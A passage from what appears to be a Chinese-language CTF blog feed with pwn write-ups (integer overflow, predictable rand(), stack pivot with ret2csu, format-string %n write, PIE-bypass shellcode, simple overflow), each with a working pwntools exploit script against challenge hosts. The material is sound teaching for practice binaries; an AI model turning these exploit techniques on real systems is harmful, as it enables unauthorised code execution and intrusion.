number">0x04008DA</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得flag：<br><img src="/images/Mary-Morton/7.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn-write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>int_overflow(整数溢出)</title>
      <link href="/2022/12/31/int-overflow/"/>
      <url>/2022/12/31/int-overflow/</url>
      
        <content type="html"><![CDATA[<h2 id="int-overflow-wp"><a href="#int-overflow-wp" class="headerlink" title="int_overflow  wp"></a>int_overflow  wp</h2><p>这题涉及到了整数溢出漏洞，值得写一篇博客。<br>先checksec一下：<br><img src="/images/int-overflow/1.png"><br>只开了NX保护机制<br>拖入IDA查看：<br><img src="/images/int-overflow/2.png"><br>主函数里没有什么可以利用的<br>打开login（）函数：<br><img src="/images/int-overflow/3.png"><br>有read函数但是无法溢出……打开check_passwd函数这里涉及到一个知识点unsigned_int8定义的是一个无符号型8位整数<br>具体解释如下：</p><pre class="line-numbers language-none"><code class="language-none">int8取值范围是-128 - 127unsigned int8 0-255Int16 意思是16位整数(16bit integer)，相当于short 占2个字节 -32768 ~ 32767Int32 意思是32位整数(32bit integer), 相当于 int 占4个字节 -2147483648 ~ 2147483647Int64 意思是64位整数(64bit interger), 相当于 long long 占8个字节 -9223372036854775808 ~ 9223372036854775807<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里涉及到一个整数溢出：strlen函数读取buf的字符长度以int类型返回是32位字节的，而将它赋给了v3如果返回值大于255则会发生整数溢出，将高位字节截断保留低位字节<br>我们看到if函数的else部分是我们可以利用的，有个危险函数strcpy（）可以复制任意长度字符串，这里可以将s的字符串复制到dest数组并发生溢出<br>那思路就拟好了先让v3在4~8区间内判断到else区间执行然后该怎么覆盖怎么覆盖<br>dest的栈空间如下：<br><img src="/images/int-overflow/4.png"><br>上exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"223.112.5.156"</span><span class="token punctuation">,</span><span class="token number">63036</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">24</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x0804868b</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">232</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"username:\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"zjh"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"passwd:\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得flag：<br><img src="/images/int-overflow/5.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn-write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>guess_num(伪随机数绕过)</title>
      <link href="/2022/12/28/guess-num/"/>
      <url>/2022/12/28/guess-num/</url>
      
        <content type="html"><![CDATA[<h2 id="guess-num-wp"><a href="#guess-num-wp" class="headerlink" title="guess_num wp"></a>guess_num wp</h2><p>为什么写这题呢？感觉这题很有代表性（学到的东西挺多），以后很多的问题可以提前解决，所以写一篇博客记录一下。<br>先checksec一下：<br><img src="/images/guess-num/1.png"><br>吓死本菜鸡了！竟然三个保护机制全开了！<br>我们拖入IDA查看：<br><img src="/images/guess-num/2.png"><br>代码还有点小长……<del>当场决定放弃</del>咳咳，这题着实吓到我了，看一下有没有威胁函数，发现gets函数可以无限输入<br>硬着头皮查看每个函数，发现：<br><img src="/images/guess-num/03.png"><br>sub_C3E函数里可以直接抓取flag，回去看一眼这个函数的位置，在最底部，中间有个循环判断而且有个exit（0）想要运行sub_C3E必须要绕过他（从判断脱离出来）<br>但我又不知道srand()函数和rand()函数有什么作用……去网上查一查发现这两个函数要配合使用srand()函数为rand()函数初始化，srand()里的参数不同对应rand()的产生的随机数也不同<br>但只要srand()里的数是固定的，那么rand产生的随机数也是固定的。<br>那么就要自己写个程序：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> key<span class="token punctuation">,</span>i<span class="token punctuation">;</span><span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>key<span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行去查看它产生的随机数，这里我们选择0<del>（方便）</del><br>又涉及到一个冷知识同一串程序在linux和windows中产生的随机数是不一样的！<del>好吧，摊牌了我看了wp，哈哈</del>咳咳，<br>结果把cpp文件拖到虚拟机里运行又出了问题……<br><img src="/images/guess-num/04.png"><br>这里要改一下进行以下操作：</p><pre class="line-numbers language-none"><code class="language-none">1.  cc c.cpp（原来的名字） -o 1c（想改的文件名）2.  .&#x2F;1c  #运行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>我原来的文件名是c.cpp经过上述操作改成了1c（就可以用了，我也不知道为什么）<br>运行一下：<br><img src="/images/guess-num/5.png"><br>把数据记下来。<br>上exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"223.112.5.156"</span><span class="token punctuation">,</span><span class="token number">60001</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">32</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your name:"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>rand<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token builtin">int</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your guess number:"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rand<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得flag：<br><img src="/images/guess-num/6.png"><br>当然还有不用写脚本的方法：<br>贴上exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span>libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">54069</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Your name:"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>payload<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Please input your guess number:"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> pwn-write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈转移原理与通用garget的使用</title>
      <link href="/2022/12/28/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2022/12/28/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="栈转移原理与通用rop的使用"><a href="#栈转移原理与通用rop的使用" class="headerlink" title="栈转移原理与通用rop的使用"></a>栈转移原理与通用rop的使用</h1><p>此题下载链接：<br><a href="/download/advanced">点击下载</a><br>这里我们通过一题pwn题边解边说：<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/1.png"><br>可以看到，这题讲解示范没有开任何保护。<br>拖入ida查看：<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/2.png"><br>这里打印的是system、execv函数在libc的地址<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/3.png"><br>查看vul函数发现有溢出点但是字节有限只能溢出24个字节，而此题没有现成的system或execv函数可用，直接溢出并不现实<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/4.png"></p><h3 id="栈转移原理"><a href="#栈转移原理" class="headerlink" title="栈转移原理"></a>栈转移原理</h3><p>现在介绍一个新的方法：<strong>栈转移</strong><br>当碰到这种题目时，因为溢出字节不够，要转移到别的栈段上运行已准备好的rop<br>栈是由rbp和rsp决定的，尤其是后者rsp在哪，栈就在哪。因此，我们只需要想办法把rsp指针转移到我们需要的地方即可。而想要改变rsp的值，可以先通过改变rbp的值，再把rbp的值传递给rsp就可以达到栈转移到目的。<br>实际方法用leave ret指令可以做到<br>我们知道leave指令相当于</p><pre class="line-numbers language-none"><code class="language-none">move rsp, rbppop  rbp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ret指令相当于：</p><pre class="line-numbers language-none"><code class="language-none">pop rip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因此将rbp的值先覆盖成目标地址，利用函数自带的leave指令先将rbp控制，接下另一段leave ret的garget的地址就可以实现rsp的控制实现栈转移，至于转移后rbp的值并不重要<br>leave;ret;地址：<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/5.png"></p><h3 id="通用garget原理"><a href="#通用garget原理" class="headerlink" title="通用garget原理"></a>通用garget原理</h3><p>已经把栈转移到了grobe_buf去了，接下来设置该区域的rop链，我们用通用garget<br>我们点开_libc_csu_init这个函数<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/7.png"><br>可以发现这里的garget是不是很齐全，只要调用了这里几乎哪里都能call，这里分为两个garget分别记下地址<br>这里说一下怎么查看execv函数got表地址：<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/9.png"><br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/10.png"><br>接下来上exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./advanced'</span><span class="token punctuation">)</span>payload1<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">80</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x404080</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x4011fb</span><span class="token punctuation">)</span><span class="token comment">#leave ret的地址</span>payload2<span class="token operator">=</span><span class="token string">b'/bin/sh\x00'</span><span class="token comment">#将/bin/sh\x00输入grobe_buf中</span>payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x40133a</span><span class="token punctuation">)</span><span class="token comment">#通用garget pop部分</span>payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#rbx</span>payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#rbp</span>payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x404080</span><span class="token punctuation">)</span><span class="token comment">#将/bin/sh的地址给r12，r12后会给rdi</span>payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#r13</span>payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#r14 这两个值看调用函数原型的要求来定</span>payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x403ff8</span><span class="token punctuation">)</span><span class="token comment">#execv函数在got表的真实地址</span>payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x401320</span><span class="token punctuation">)</span><span class="token comment">#通用garget call部分</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'global:'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结束战斗：<del>（由于是本地做题没有flag）</del><br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/11.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn原理讲解 pwn_write_up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CGfsb_wp——格式化字符串漏洞</title>
      <link href="/2022/12/27/CGfsb-wp/"/>
      <url>/2022/12/27/CGfsb-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h2><p>先将其在终端checksec一下：<br><img src="/images/CGfsb-wp/1.png"><br>32位程序，开了NX(堆栈不可执行)以及CANNARY(栈保护)，但这题开cannary真没感觉有什么用，又不是用栈溢出，奇怪……<br>拖入IDA查看代码<br><img src="/images/CGfsb-wp/2.png"><br>有两个输入点，这里重点看这个printf(s);这个是C语言学习中没涉及到的，等等会细说<br>观察有个system(“cat flag”);可以直接抓取flag于是思路清晰只要然pwnme&#x3D;8就可以了，双击pwnme发现他存储在bss段，我们要如何才能用栈段的数据写到它那去呢？<br>这里就涉及到一个漏洞：格式化字符串漏洞<br>一般上格式是</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span>“<span class="token operator">%</span>s”，s<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但变成了</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">%d - 十进制 - 输出十进制整数%s - 字符串 - 从内存中读取字符串%x - 十六进制 - 输出十六进制数%c - 字符 - 输出字符%p - 指针 - 指针地址%n - 到目前为止所写的字符数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>特别注意%n，它的功能是将%n之前打印出来的字符个数，赋值给一个变量比如：<br><img src="/images/CGfsb-wp/3.png"><br>a的值被改变了<br>也就是说他在某种特定环境下可以作为一个scanf来使用（不懂这个打死都别想做出来）<br>比如这里的偏移量为10，<strong>指的是输入的数据会作为printf的调用栈空间的第10个参数</strong>（在缓冲区的数据在第10个参数）<br>我们需要将pwnme的地址输入到s的空间去，在合适的位置上加一个%n，使其与我们输入的地址对应，从而造成漏洞利用<br>所以接下来的问题变成了如何让他们对应起来<br>对其运行输入<br><img src="/images/CGfsb-wp/4.png"><br>发现偏移量为10<br>上exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">56143</span><span class="token punctuation">)</span>pwnme<span class="token operator">=</span>p32<span class="token punctuation">(</span><span class="token number">0x0804A068</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>pwnme<span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span><span class="token string">b'%10$n'</span><span class="token comment">#pwnme和aaaa正好组成8个字符，%10$n是对第10个参数进行定位，然后更改其数值</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"zjh"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please:\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>get shell!拿到flag<br><img src="/images/CGfsb-wp/5.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn-write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>repeater_wp</title>
      <link href="/2022/12/26/repeater-wp/"/>
      <url>/2022/12/26/repeater-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="repeater"><a href="#repeater" class="headerlink" title="repeater"></a>repeater</h2><p>遇到的第一题开PIE保护机制的pwn题，写一篇记录一下<br>PIE保护机制就是使程序的基地址随机化让我们无法进行shellcode的注入、rop链的搭建等，因此需要解题的第一件事就是找出程序的基地址，目标明确！<br>首先先将其checksec一下：<br><img src="/images/repeater-wp/1.png"><br>发现此题只开了PIE保护，NX保护机制没开可以实现shellcode注入，因此目标：找出基地址，并实现shellcode注入获取shell。<br>将其拖入IDA进行查看：<br><img src="/images/repeater-wp/2.png"><br>实际地址&#x3D;基地址+偏移地址，想要实际地址要知道基地址和偏移地址。在图中告诉我们s的偏移地址为rbp-30h，v5的偏移地址为rbp-10h二者相差20h（32字节），<br>read函数以s的地址为底可以溢出64个字节可以覆盖至返回地址！<br>对于sub_982（byte_202040，48ull）函数的功能单看应该是看不出来的但我们在终端中可以测试这个函数的功能<br><img src="/images/repeater-wp/3.png"><br>我们发现这个函数是进行输入名字的，通过浅浅分析它把名字放到了202040这个地址，可以将shellcode注入这里。<br>main函数偏移地址可以直接查看：<br><img src="/images/repeater-wp/4.png"><br>所以整体思路用exp来表示：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'61.147.171.105'</span><span class="token punctuation">,</span><span class="token number">64894</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>shellcode<span class="token operator">=</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name :'</span><span class="token punctuation">,</span>shellcode<span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">32</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">3281697</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"input :"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"you :\n0x"</span><span class="token punctuation">)</span>main_addr<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token string">'12'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>b_addr<span class="token operator">=</span>main_addr<span class="token operator">-</span><span class="token number">0xa33</span>shellcode_addr<span class="token operator">=</span>b_addr<span class="token operator">+</span><span class="token number">0x202040</span>payload2<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">16</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"input :"</span><span class="token punctuation">,</span>payload2<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得shell。</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn-write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hello_pwn</title>
      <link href="/2022/12/25/hello-pwn/"/>
      <url>/2022/12/25/hello-pwn/</url>
      
        <content type="html"><![CDATA[<h2 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h2><p>先将其在终端中checksec下：<br><img src="/images/hello_pwn/1.png"><br>只开了NX保护，推断是个栈溢出问题。<br>拖进IDA查看：<br><img src="/images/hello_pwn/2.png"><br>发现有个read函数可溢出16个字节。<br>对其中函数分析发现sub_400686()函数可直接调用system函数抓取flag：<br><img src="/images/hello_pwn/3.png"><br>目标明确！要调用sub_400686()，于是我们回头查看条件<br><img src="/images/hello_pwn/2.png"><br>发现只需让dword_60106C &#x3D;&#x3D; 1853186401即可<br>查看栈帧：<br><img src="/images/hello_pwn/4.png"><br>发现非常凑巧的unk_601068离dword_60106c只差4个字节栈，溢出完全够用<br>上exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./hello_pwn'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1853186401</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'bof'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/hello_pwn/5.png"><br>成功获得shell，由于是在本地下载做的所以没有flag的文件，但在远程会有这个文件，也算是成功了</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn-write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅尝pwn题：pwnstack</title>
      <link href="/2022/12/24/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/"/>
      <url>/2022/12/24/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/</url>
      
